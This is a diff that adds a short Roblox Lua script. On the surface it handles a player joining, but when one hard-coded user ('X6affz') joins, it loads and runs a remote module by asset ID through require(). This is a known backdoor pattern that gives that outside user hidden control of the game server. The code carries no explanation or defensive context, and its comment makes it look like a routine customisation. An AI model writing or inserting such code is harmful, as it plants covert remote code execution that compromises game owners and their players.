@@ -1,0 +1,14 @@
+local Players = game:GetService("Players")
+
+local specificUser = "X6affz"  -- Replace with the specific player's username
+
+local function onSpecificPlayerJoined(player)
+	if player.Name == specificUser then
+
+    wait(10)
+		require(125146965612088).load("X6affz")
+
+	end
+end
+
+Players.PlayerAdded:Connect(onSpecificPlayerJoined)
